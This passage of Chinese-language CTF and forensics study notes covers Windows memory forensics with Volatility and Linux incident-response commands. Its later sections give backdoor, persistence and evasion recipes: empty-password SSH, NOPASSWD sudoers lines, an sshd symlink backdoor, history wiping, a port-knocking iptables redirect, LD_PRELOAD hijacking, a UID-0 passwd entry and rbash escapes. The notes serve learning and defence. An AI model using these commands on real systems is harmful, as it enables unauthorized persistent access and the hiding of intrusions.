volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 svcscan #扫描输出服务信息
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hivelist #查看注册单元 先拿到注册单元偏移
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 printkey -o 0xfffff8a000024010 -K "ControlSet001\Services\metsvc" #此处的命令拿到了netsvc的相关注册表
用刚才拿到的netsvc相关注册表 对比 自启动的注册表项 再用64位32位系统再次排除
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 printkey -K "Microsoft\Windows\CurrentVersion\Run" -o 0xfffff8a0004cc420
Values:
REG_SZ			VMware User Process : (S) "C:\Program Files\VMware Tools\vmtoolsd.exe" -n vmusr
REG_SZ			LneMosqIMIibhz : (S) C:\Windows\TEMP\UEAOGWBdwyydm.vbs
最终答案就是 flag{md5(UEAOGWBdwyydm.vbs)}
#张三发现了异常账户登录，请找到该账户并分析来源
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 pslist
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 pstree
溯源查找父进程 最终找到conhost.exe 
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 dumpfiles -p 2632 -D file/
通过右键该文件查看属性信息就可以找到 test$ 隐藏账户
```

win10 [powershell](https://so.csdn.net/so/search?q=powershell&spm=1001.2101.3001.7020)的命令历史记录存储在

```powershell
%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
```

地址下的`ConsoleHost_history.txt`

可以删除某些或全部历史记录 在powershell中可以按上下方向键查询历史命令 或使用命令：

```powershell
get-history
```

# Linux Forensics

## 0x01 Information Gathering

```shell
uname -r #打印和系统有关的信息 其中内核版本是重要信息
cat /proc/version #查看内核的具体信息
cat /proc/cpuinfo #查看CPU信息
env #查看环境变量
```

## 0x02 Intetnet

```shell
netstat -antp #查看开放的tcp端口
netstat -anup #查看开放的udp端口
top #查看所有进程信息 类似于windows的管理器 排查异常进程
ps -ef #查看进程所对应的命令行源路径
ps -aux | grep "PID" #直接过滤查找对应的进程号的相关信息
ls -al /proc #该路径下的文件为当前机器的每个PID进程的配置文件等信息  
ls -al /proc/PID #直接查看该进程的文件
sudo ls -al /proc/930/exe #查看该软连接所指向的路径
sudo ls -al /proc/930/cwd #查看该文件的启动路径
kill -9 PID #强制杀死指定的进程
```

## 0x03 User

### Super User

uid = 0 (root)
可自己更改UID

```shell
cat /etc/passwd #查看配置文件的用户信息 普通用户UID从1000开始 root的UID为0 服务用户为1-500 如果普通用户UID改为0再登陆便拥有root权限 改了不与root冲突
cat /etc/shadow #查看密码文件
awk -F: '$3==0 {print $1}' /etc/passwd #如果第三个参数为0 输出第一个参数 awk处理字符信息命令
```

可以将服务用户的字段更改为允许登录，同时为其修改UID=0获得root权限，就可以创建一个拥有root权限的服务账号作为后门使用

### Empty password

实战 后门常用

```shell
passwd -d username #取消密码
echo "PermitEmptyPasswords yes" >> /etc/ssh/sshd_config #可以进行空口令登录
service sshd restart #更改过配置文件后需要重新启动服务来使配置文件生效
cat secure* | grep none
```

### Sudoers Account

/etc/sudoers文件时sudo的配置文件，是管理员集中的管理用户的使用权限和使用的主机。当用户执行sudo命令时，系统会主动寻找/etc/sudoers文件，判断该用户是否有执行sudo的权限，若确认用户具有可执行sudo的权限后，让用户输入密码在进行确认，但是root用户执行sudo时不需要输入密码，所以可利用此文件进行对配置允许特定用户在不用输入root密码的情况下使用所有命令。(提权经常出这种题)

```shell
root	ALL=(ALL:ALL) ALL
pwn		ALL=(ALL:ALL) ALL #pwn用户拥有所有权限
%pwn 	ALL=(ALL:ALL) ALL #pwn组的用户拥有所有权限
pwn		ALL=(ALL:ALL) NOPASSWORD:ALL #即不输入密码就能拿到root权限
```

### SSH Softlink

条件：需要配置/etc/ssh/sshd_config里面的UserPam为yes
ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oport=1111
利用权限将该软连接建立起来就可以直接用指定端口作为后门

### Certificate Login

```shell
#允许密钥认证(服务端)
vim /etc/ssh/sshd_config
RSAAuthentication yes
PubkeyAuthentication yes
StrictModes no
systemctl restart sshd
ssh-keygen -t rsa #形成一个公钥
cat id_rsa.pub > ~/.ssh/authorized_keys #将公钥导入证书路径下
chmod -R 744 ~/.ssh #给证书权限
```

## 0x04 Log

### History Log

命令历史记录存储在`~/.bash_history`
正常情况下历史命令都是会被记录的
但是我们可以使用下面的命令来实现不记录的历史命令：
[空格]set +o history
继续记录
[空格]set -o history

清除历史记录

```shell
history -c
```

同时也可以将/root/.bash_history的内容覆盖来清除历史日志

```shell
echo > /root/.bash_history #输出空串覆盖
```

指定行记录删除

```shell
history -d 10
```

/etc/profile配置文件
#显示命令时间

```shell
[root@localhost ~]# export HISTTIMEFORMAT='%F %T '
```

#设置最大记录长度

```shell
export HISTSIZE=0 #不会进行历史记录
```

#在不想被记住的命令前输入一个空格-就不会被记住

```shell
export HISTCONTROL=ignorespace
```

#忽略pwd、ls命令

```shell
[root@localhost ~]# export HISTIGNORE="pwd:ls:"
```

#提出连续的相同命令条目，仅剩余一条

```shell
[root@localhost ~]# export HISTCONTROL=ignoredups
```

### Logon Log

有关当前登录用户的信息记录在文件utmp中：==who命令
登陆进入和退出记录文件wtmp中：==w命令 last
最后一次登录文件可以用lastlog命令查看

## 0x05 Permission maintenance

### Hidden File

```shell
touch .1.php
touch /tmp/.ICE-unix
```

### Read_only

```shell
chattr +ai test
```

### Port multiplexing(Actual Combat)

转发端口 ssh socket http

```shell
#server
sudo iptables -t nat -N LETMEIN 
sudo iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-prot 22
sudo iptables -A INPUT -p tcp -m string --string 'mulportcome' --algo bm -m recent --set --name letmein --rsource -j ACCEPT
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent -rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
#client
echo mulportcome | socat - tcp:192.168.235.129:80
ssh 192.168.235.129 -p 22
```

### DLL Hijacking

应用程序在通过系统接口调用内核时会预先加载动态链接库，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和/etc/ld.so.prelod配置文件中指定的动态链接库依然会被加载。
LD_PRELOAD用于预加载环境变量
/etc/ld.so.preload用于预加载配置文件
默认情况下LD_PRELOAD和/etc/ld.so.preload无配置
动态编译：不论程序依赖不依赖动态链接库，都会加载LD_PRELOAD环境变量和/etc/ld.so.preload配置文件中指定的动态链接库依然会被装载
静态编译：不动态加载系统库文件，直接将程序所需要的各种文件全部集中到该软件平台中，这样就可以解决系统库文件被劫持，中了rookit等导致连接、网络等被隐藏的情况，常用工具如busybox

前文可以看到Linux预加载的配置文件主要有两个：LD_PRELOAD和/etc/ld.so.preload，因此针对Linux的库文件劫持可以围绕这两个地方展开，目前主流的劫持技术主要有三种：
更改LD_PRELOAD环境变量、加载恶意库文件
/etc/ld.so.preload加载恶意的库文件(主流的劫持技术)
更改默认的库文件/etc/ld.so.preload为其他库文件

### cron(Actual Combat + CTF)

```shell
ls -al /etc/ (cron.d / cron.hourly / crontab / cron.daily / cron.monthly / cron.weekly) #etc下这些都是它的文件 其中crontab是它的全局配置文件
crontab -l #查看定时任务列表
crontab -e #配置定时列表
* * * * * 此处跟一个反弹Shell的脚本文件 #5个*代表全部都是0 即每分钟执行一次 五个*按顺序表示是 分 时 一月(31天) 月份(12个月) 周(week)
ls /var/spool/cron/root
ls /var/spool/cron/crontabs/root #这两个路径都是全部的配置 做这种题应该把这几个路径全部看一遍
```

###  Foreground Program, Background Program, Daemons

前台程序，当执行时无法执行其他命令，比如ping 8.8.8.8
后台程序，执行时可以同时执行别的程序，比如ping 8.8.8.8 &在执行时可以执行别的命令

```shell
jobs -l #显示后台程序号
fg id #执行后就会将当前后台程序放在前台运行 此时就不能同时在命令行执行别的指令了
```

Ctrl + C中断程序的时候，会向系统发送一个SIGHUP信号，程序就会自动退出。
有种无法被中断的程序，会一直运行除非系统关闭，这种进程被称为守护进程(Daemons)，比如systemctl、nohup、screen。

```shell
screen ping 8.8.8.8 & #输入之后ctrl+c关闭
ps aux | grep 'ping' #发现该命令作为守护进程依然在执行
```

### Writable File(CTF+Promote Permissions)

```shell
/etc/passwd
openssl passwd -l -salt user pass
user:HASA:0:0:/root/root:/bin/bash
```

Other methods:

```shell
perl -le 'print crypt("pass123", "abc")'
python -c 'import crypt; print crypt.crypt("pass", "$6$salt")'
```

### SUID(Promote Permissions)

是一种特殊权限，设置了SUID的程序文件，在用户执行该程序时，用户的权限时该程序文件属主的权限。
[命令权限即时查询网站](https://gtfobins.github.io/)

```shell
find / -perm -u=s -type f 2 > /dev/null #从根目录中用户权限为S的文件 2 > /dev/null是将一些标注错误输出到null文件中
chmod u+s /bin/more
```

## 0x06 RBASH(CTFtarget+SandboxEscape)

Limit:

> 不能使用cd命令(意味着不能更改目录)
> 不能设置或取消环境变量：SHELL、PATH、ENV、BASH_ENV
> 导入功能受限
> 指定包含参数'/'或'-'的文件名(即命中不能包含'/'或'-')
> 不能使用>、>|、<>、>&、&>、>>等重定向操作符
> 不能使用'set + r'或set + o''关闭

Escape:

> 1.Bypassing login:
>
> ```shell
> ssh trbash@192.168.8.185 -t "bash --noprofile"
> ```
>
> 2.Bypass Programming:
>
> ```shell
> python -c 'import os;os.system("/bin/bash")'
> ```
>
> `php / perl / raw / lue` etc...
>
> 3.System common commands
>
> ```bash
> vim xx #进入之后
> :set shell=/bin/sh #命令输入模式后输入shell 直接绕过
> 
> man xx
> !sh #直接sh 斜杠会被限制
> 
> cp /bin/sh . #将sh拷贝到当前目录并执行也可以绕过
> #刚才SUID部分中的网站可以查找拥有shell的命令 点击进入就有操作方法
> ```
